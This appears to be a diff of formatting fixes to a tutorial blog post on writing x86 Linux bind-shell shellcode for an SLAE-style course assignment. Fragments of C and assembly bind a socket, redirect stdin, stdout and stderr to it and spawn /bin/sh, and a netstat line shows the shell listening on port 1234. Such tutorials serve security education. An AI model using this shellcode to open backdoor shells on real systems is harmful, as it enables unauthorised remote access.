@@ -53,7 +53,7 @@ int main()
         server.sin_family = AF_INET;
         server.sin_port = htons(PORT); // convert into network byte order
         server.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0
-        bind(sockfd, (struct sockaddr *) &server,   sizeof(server));              
+        bind(sockfd, (struct sockaddr *) &server, sizeof(server));              
         listen(sockfd, 0) ;        
         resfd = accept(sockfd, NULL, NULL);           
         dup2(resfd, 2);
@@ -255,7 +255,7 @@ As seen at the code above, the port number in hex format has been pushed into th
 </p>
 
 ```python
-!/usr/bin/python 
+#!/usr/bin/python 
 
 import socket, sys 
 
@@ -352,11 +352,15 @@ After initiating the <b>accept</b> system call, there must be a redirection from
 ;;dup2(resfd, 2); 
 ;;dup2(resfd, 1); 
 ;;dup2(resfd, 0);
-mov ebx, eax      ; the first argument in dup2 has the returned socket descriptor from accept syscall. ebx now has the returned socket descriptor (resfd).
+mov ebx, eax      ; the first argument in dup2 has the returned socket 
+                  ; descriptor from accept syscall. ebx now has the 
+                  ; returned socket descriptor (resfd).
 xor ecx, ecx      ; zero out the ecx register before use it 
 lo: mov al, 0x3f  ; the functional number that indicates dup2 (63 in dec) 
 int 0x80          ; call dup2 syscall
-inc ecx           ; increase the value of ecx by 1 so it will take all values 0(stdin), 1(stdout), 2(stderr) 
+inc ecx           ; increase the value of ecx by 1 so 
+                  ; it will take all values 
+                  ; 0(stdin), 1(stdout), 2(stderr) 
 cmp cl, 0x2       ; compare ecx with 2 which indicates the stderr descriptor 
 jle lo            ; loop until counter is less or equal to 2
 </pre>
@@ -393,7 +397,7 @@ int 0x80        ; execute execve syscall**
 
 
 <p style="text-align:justify;">
-As just shown, the <b>/bin/sh</b> string is pushed onto the stack in reverse order by first pushing the terminating null value of the string, and then pushing the <b>//sh (4 bytes are required for alignment and the second / has no effect)</b>, and finally pushing the /bin onto the stack. At this point, we have all that we need on the stack, so <b>esp</b> now points to the location of /bin/sh.
+As just shown, the <b>/bin/sh</b> string is pushed onto the stack in reverse order by first pushing the terminating null value of the string, and then pushing the <b>//sh</b> (4 bytes are required for alignment and the second / has no effect), and finally pushing the <b>/bin</b> onto the stack. At this point, we have all that we need on the stack, so <b>esp</b> now points to the location of <b>/bin/sh</b>.
 </p>
 
 Then, the following commands will be used in order to compile and link the code.
@@ -415,7 +419,8 @@ Then from <b>netstat</b> tool can be seen that the target machine listens to por
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># netstat -antp | grep 1234 tcp 0 0 0.0.0.0:1234 0.0.0.0:\* LISTEN 1193/./bind
+<span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># netstat -antp | grep 1234 
+tcp 0 0 0.0.0.0:1234 0.0.0.0:* LISTEN 1193/./bind
 </pre>
 
 Now if we use **netcat** we will be able to connect to the target machine at port **1234** as seen below
